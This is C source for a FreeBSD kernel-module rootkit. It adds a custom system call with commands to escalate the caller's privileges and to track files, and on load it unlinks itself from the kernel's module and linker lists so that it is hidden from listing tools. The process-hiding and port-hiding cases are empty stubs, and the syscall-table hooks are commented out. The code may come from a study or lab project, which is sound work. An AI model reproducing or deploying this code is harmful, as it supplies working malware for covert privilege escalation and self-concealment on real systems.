#include "rootkit.h"

struct node * first_node = NULL;

/* The system call's arguments. */
struct rootkit_args {
	int command;
	char ** args;
};

static int mod_unlink(struct module *module, int cmd, void *arg);
static int mod_load(struct module *module, int cmd, void *arg);
static int mod_unload(struct module *module, int cmd, void *arg);

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

static int testfd = 0;
//Following fd functions taken from https://lists.freebsd.org/pipermail/freebsd-hackers/2007-May/020625.html

static int filewriter_closelog(struct thread *td, int fd)
{
  printf("filewriter_closelog fd: %d\n", fd);
  if(fd)
  {
    struct close_args fdtmp;
    fdtmp.fd = fd;
    printf("filewriter_closelog thread ptr: %x\n", (unsigned int)td);
    return sys_close(td, &fdtmp);
  }
  return 0;
}

static int filewriter_openlog(struct thread *td, int *fd, char *path)
{
  int error;
  error = kern_openat(td, AT_FDCWD, path, UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0644);
  if (!error)
  {
    *fd = td->td_retval[0];
    printf("openlog fd: %d\n", *fd);
  }
  else
    printf("openlog failed\n");
  return error;
}

static int filewriter_writelog(struct thread *td, int fd, char *line, u_int len)
{
  struct uio auio;
  struct iovec aiov;
  int err;

  bzero(&aiov, sizeof(aiov));
  bzero(&auio, sizeof(auio));

  aiov.iov_base = line;
  aiov.iov_len = len;

  auio.uio_iov = &aiov;
  auio.uio_offset = 0;
  auio.uio_segflg = UIO_SYSSPACE;
  auio.uio_rw = UIO_WRITE;
  auio.uio_iovcnt = 1;
  auio.uio_resid = len;

  auio.uio_td = td;

  printf("fd: %u\n", fd);
  //printf(aiov.iov_base);
  err = kern_writev(td, fd, &auio);
  printf("write err: %u\n", err);

  return err;
}


/* The system call function. */
static int main(struct thread *td, void *syscall_args) {

	struct rootkit_args *uap;
	uap = (struct rootkit_args *)syscall_args;

	long resp;

	switch(uap->command){
		case 0:// Unload
			break;
		case 1:// Escalate
			elevate(td);
			break;
		case 2:// Add file to tracker
			add_file(uap->args[0]);
			break;
		case 3:// Remove file from tracker
			remove_file(uap->args[0]);
			break;
		case 4:// Set tracker flags
			resp = strtol(uap->args[1], NULL, 16);
			set_flag_bits(uap->args[0], (uint8_t)resp);
			break;
		case 5:// Unset tracker flags
			resp = strtol(uap->args[1], NULL, 16);
			unset_flag_bits(uap->args[0], (uint8_t)resp);
			break;
		case 6://Hide process
			break;
		case 7://Unhide process
			break;
		case 8://Hide port
			break;
		case 9://Unhide port
			break;
		default:
			break;
	}

	return(0);
}

/* The sysent for the new system call. */
static struct sysent rootkit_sysent = {
	2,			/* number of arguments */
	main		/* implementing function */
};

static int mod_unlink(struct module *module, int cmd, void *arg)
{
	struct linker_file *lf;
	struct module *mod;

	sx_xlock(&kld_sx);

	/* Decrement the current kernel image's reference count. */
	(&linker_files)->tqh_first->refs--;

	/*
	 * Iterate through the linker_files list, looking for LINKER_FILE.
	 * If found, decrement next_file_id and remove from list.
	 */
	TAILQ_FOREACH(lf, &linker_files, link) {
		if (strcmp(lf->filename, LINKER_FILE) == 0) {
			next_file_id--;
			TAILQ_REMOVE(&linker_files, lf, link);
			break;
		}
	}

	sx_xunlock(&kld_sx);

	sx_xlock(&modules_sx);

	/*
	 * Iterate through the modules list, looking for "incognito."
	 * If found, decrement nextid and remove from list.
	 */
	TAILQ_FOREACH(mod, &modules, link) {
		if (strcmp(mod->name, MODULE_NAME) == 0) {
			nextid--;
			TAILQ_REMOVE(&modules, mod, link);
			break;
		}
	}

	sx_xunlock(&modules_sx);

	return 0;
}

static int mod_load(struct module *module, int cmd, void *arg)
{
	// sysent[SYS_kldnext].sy_call = (sy_call_t *)hook_sys_kldnext;
	// sysent[SYS_getdirentries].sy_call = (sy_call_t *)hook_sys_getdirentries;
	// sysent[SYS_open].sy_call = (sy_call_t *)hook_sys_open;
	// sysent[SYS_openat].sy_call = (sy_call_t *)hook_sys_openat;

	char buf[256] = {0};
	snprintf(buf,256,"%d",offset);

	filewriter_openlog(curthread, &testfd, "useful.txt");
	filewriter_writelog(curthread, testfd, buf, strlen(buf));
	filewriter_closelog(curthread, testfd);

	mod_unlink(module, cmd, arg);

	return 0;
}

static int mod_unload(struct module *module, int cmd, void *arg)
{
	// sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext;
	// sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
	// sysent[SYS_open].sy_call = (sy_call_t *)sys_open;
	// sysent[SYS_openat].sy_call = (sy_call_t *)sys_openat;

	return 0;
}

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg) {
	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		error = mod_load(module, cmd, arg);
		break;

	case MOD_UNLOAD:
		error = mod_unload(module, cmd, arg);
		break;

	default:
		error = EOPNOTSUPP;
		break;
	}

	return(error);
}

static struct syscall_module_data rootkit_func_mod = {
	load, NULL, &offset, &rootkit_sysent, { 0, NULL }
};

static moduledata_t rootkit_mod = {
	MODULE_NAME,
	syscall_module_handler,
	&rootkit_func_mod
};

DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);

